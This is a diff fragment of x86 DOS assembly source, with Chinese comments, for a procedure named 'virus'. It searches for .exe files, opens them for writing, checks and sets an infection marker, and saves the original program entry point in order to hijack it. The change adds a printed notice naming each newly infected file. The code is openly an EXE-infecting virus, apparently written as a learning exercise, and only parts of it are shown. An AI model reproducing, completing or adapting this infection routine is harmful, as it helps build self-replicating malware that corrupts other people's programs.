@@ -60,17 +60,11 @@ virus proc
              cmp    ah,al
              jne    modify
              loop   check
-             lea    dx,[bp+offset dta]          ;匹配结果在磁盘缓冲区中,00f4
-             add    dx,1eh                      ;文件名地址在1e~2ah
-             mov    ah,09h
-             int    21h
              jmp    error
              
     modify:  
              lea    dx,[bp+offset dta]          ;匹配结果在磁盘缓冲区中,00f4
              add    dx,1eh                      ;文件名地址在1e~2ah
-             mov    ah,09h
-             int    21h
 
              mov    ax,3d02h                    ;3d打开文件,02方式：读写
              int    21h
@@ -94,6 +88,11 @@ virus proc
              cmp    word ptr [si+2ah],8888h     ;检查是否已被感染,0159
              je     nextfile
              mov    word ptr [si+2ah],8888h
+
+             lea    dx,[bp+offset dta]          ;提示已感染
+             add    dx,1eh                      
+             mov    ah,09h
+             int    21h
 
              mov    ax,word ptr [si+14h]       ;保存原程序入口;14-15H是原EXE文件载入时ip初始值
              mov    word ptr [si+2eh],ax       ;保存信息在head
@@ -160,7 +159,7 @@ virus endp
 
     filename db     "*.exe",0
     dta      db     02ch dup(0)
-    enter    db     13,10,'$'
+    enter    db     'This file has the virus.',13,10,'$'
     string   db     "I'm a virus!",13,10,'$'
     head     db     30h dup(0)
     string_virus    db     "VIRUS"
